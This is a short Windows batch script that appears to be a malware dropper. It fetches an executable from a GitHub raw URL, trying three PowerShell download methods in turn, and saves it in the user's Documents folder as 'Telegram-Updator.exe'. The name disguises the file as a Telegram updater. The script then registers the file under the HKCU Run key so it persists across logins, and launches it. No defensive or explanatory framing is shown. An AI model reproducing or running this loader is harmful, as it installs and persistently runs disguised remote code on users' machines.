@echo off 

set "url=https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe"
for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"
set "dest=C:\Users\%user%\Documents\Telegram-Updator.exe" 
set "AppName=Telegram-Updator"



:download 
PowerShell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%dest%'"
if ERRORLEVEL 1 (
	PowerShell -Command "Invoke-RestMethod -Uri '%url%' -OutFile '%dest%'"
	if ERRORLEVEL 1 ( 
		PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('%url%' , '%dest%')"
	)
)
:check 
if exist "%dest%" (  
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%AppName%" /t REG_SZ /d "%dest%" /f
	start "" "%dest%"
	
) else (
	timeout /t 1 >nul
	goto check 
)
